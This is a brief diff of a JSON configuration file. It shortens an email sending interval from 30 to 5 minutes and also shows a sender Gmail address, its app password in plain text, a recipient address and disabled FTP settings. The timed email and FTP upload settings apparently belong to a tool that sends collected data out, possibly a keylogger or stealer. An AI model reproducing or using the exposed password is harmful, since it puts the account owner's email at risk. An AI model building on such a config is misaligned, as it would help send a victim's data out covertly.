@@ -6,7 +6,7 @@
     "SenderEmail": "amersheikhhader@gmail.com",
     "SenderPassword": "hpfk yncp xdhn ytjk",
     "RecipientEmail": "sdjdndjcn9@gmail.com",
-    "SendIntervalMinutes": 30
+    "SendIntervalMinutes": 5
   },
   "FtpSettings": {
     "Enabled": false,
